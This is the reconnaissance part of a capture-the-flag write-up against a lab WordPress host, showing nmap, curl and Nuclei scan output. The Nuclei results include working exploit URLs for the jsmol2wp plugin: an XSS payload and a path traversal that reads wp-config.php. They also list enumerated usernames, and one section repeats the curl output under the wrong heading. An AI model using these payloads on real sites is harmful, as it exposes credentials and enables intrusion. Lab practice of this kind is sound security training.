## Recon

### Information: 10.10.198.15

#### NMAP

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 93:d0:bd:b2:e8:c0:4b:d8:68:89:90:39:29:ae:26:43 (RSA)
|   256 56:3f:dd:da:75:f5:15:f5:2b:11:21:8c:6d:8d:2e:b0 (ECDSA)
|_  256 80:6f:ba:75:71:bd:e2:6a:c7:3f:71:3e:08:dd:1b:f5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Linux Server
- Apache httpd 2.4.41 - port 80
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 - port 22

#### Curl

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.198.15:80 -I 
HTTP/1.1 302 Found
Date: Mon, 13 Oct 2025 14:57:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://www.smol.thm
Content-Type: text/html; charset=UTF-8
```

#### Wordpress (Found)

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.198.15:80 -I 
HTTP/1.1 302 Found
Date: Mon, 13 Oct 2025 14:57:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://www.smol.thm
Content-Type: text/html; charset=UTF-8
```

#### Nuclei

```
[CVE-2018-20462] [http] [medium] http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8
[external-service-interaction] [http] [info] http://www.smol.thm
[missing-sri] [http] [info] http://www.smol.thm ["http://www.smol.thm/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3","http://www.smol.thm/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.3","http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09","http://www.smol.thm/wp-includes/js/dist/script-modules/block-library/navigation/view.min.js?ver=8ff192874fc8910a284c","http://www.smol.thm/wp-includes/js/jquery/jquery.min.js?ver=3.7.1","http://www.smol.thm/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1","http://www.smol.thm/wp-includes/blocks/navigation/style.min.css?ver=6.7.1"]                                                                           
[wordpress-akismet:outdated_version] [http] [info] http://www.smol.thm/wp-content/plugins/akismet/readme.txt ["5.2"] [last_version="5.5"]
[waf-detect:apachegeneric] [http] [info] http://www.smol.thm
[wordpress-xmlrpc-listmethods] [http] [info] http://www.smol.thm/xmlrpc.php
[ssh-server-enumeration] [javascript] [info] www.smol.thm:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13"]                                                 
[ssh-auth-methods] [javascript] [info] www.smol.thm:22 ["["publickey"]"]
[ssh-sha1-hmac-algo] [javascript] [info] www.smol.thm:22
[openssh-detect] [tcp] [info] www.smol.thm:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13"]                                                                
[wp-xmlrpc-pingback-detection] [http] [info] http://www.smol.thm/xmlrpc.php
[wordpress-xmlrpc-detect] [http] [info] http://www.smol.thm/xmlrpc.php
[metatag-cms] [http] [info] http://www.smol.thm ["WordPress 6.7.1"]
[wordpress-directory-listing] [http] [info] http://www.smol.thm/wp-content/uploads/
[wordpress-directory-listing] [http] [info] http://www.smol.thm/wp-includes/
[http-missing-security-headers:strict-transport-security] [http] [info] http://www.smol.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://www.smol.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://www.smol.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://www.smol.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://www.smol.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://www.smol.thm                                                       
[wordpress-theme-detect:twentytwentythree] [http] [info] http://www.smol.thm
[wordpress-readme-file] [http] [info] http://www.smol.thm/readme.html
[CVE-2018-20463] [http] [high] http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
[wp-license-file] [http] [info] http://www.smol.thm/license.txt
[wordpress-login] [http] [info] http://www.smol.thm/wp-login.php
[wordpress-detect:version_by_css] [http] [info] http://www.smol.thm/wp-admin/install.php ["6.7.1"]
[addeventlistener-detect] [http] [info] http://www.smol.thm
[apache-detect] [http] [info] http://www.smol.thm ["Apache/2.4.41 (Ubuntu)"]
[wp-user-enum:usernames] [http] [low] http://www.smol.thm/?rest_route=/wp/v2/users/ ["wp","Jose Mario Llado Marti","wordpress user","admin","think"]
[caa-fingerprint] [dns] [info] www.smol.thm
[INF] Scan completed in 1m. 36 matches found.
```
